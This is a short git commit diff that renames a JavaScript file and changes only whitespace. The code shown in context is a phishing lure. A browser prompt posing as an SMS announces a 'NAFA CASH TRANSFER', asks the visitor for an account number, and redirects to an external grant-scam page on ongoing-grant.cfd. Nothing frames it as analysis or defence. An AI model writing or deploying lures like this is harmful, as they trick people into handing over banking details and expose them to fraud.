3e994ecacbb8923ff2dbf388dfce8b2d0eca9acf
The-ongoing <preciousadaowo4@gmail.com>
2026-01-05 18:57:47 +0100

    Update and rename actives.js to activees.js

--- activees.js
+++ activees.js
@@ -3,7 +3,7 @@ var password = 'WITHDRAW CASH'
 password = prompt(
   'SMS: Congratulations! You are eligible to receive NAFA CASH TRANSFER. Please press OK to Enter your Account Number.',
   'WITHDRAW CASH'
-);
+); 
 if (password != 'WITHDRAW CASH') {
   location.href = 'https://ongoing-grant.cfd/Nafa-Beneficiaries.html';
   }
